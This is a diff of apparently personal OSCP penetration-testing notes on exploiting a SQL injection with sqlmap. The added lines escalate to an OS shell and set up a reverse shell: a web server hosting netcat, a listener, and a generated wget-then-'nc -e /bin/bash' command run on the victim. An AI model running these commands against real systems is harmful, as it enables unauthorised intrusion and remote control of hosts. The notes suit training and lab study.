@@ -13,12 +13,9 @@ sqlmap -h
 ```
 
 ---
-## 
-
-Using sqlmap
+## Using sqlmap
 
 - Captured requests via Burp and modified it.
-    
 
 Copy
 
@@ -38,8 +35,33 @@ view=request&request=log&task=query&limit=100&minTime=1466674406.084434
 Save as req.txt 
 
 ```
-sqlmap -r req.txt -p limit --dbs --hex --batch
+sqlmap -r req.txt -p limit --dbs --hex --batch --os-shell
 ```
+
+After getting OS Shell, get reverse shell
+
+Host netcat on KALI ATTACKER
+```
+cd ~/Desktop/Tools && python3 -m http.server 80
+```
+
+Start Penelope listener Port 3305
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 3305 -O / --oscp-safe
+```
+
+On VICTIM HOST OS SHELL
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `wget http://${KaliIP}/nc -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/bash ${KaliIP} 3305`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+
+
+
 
 ---
 
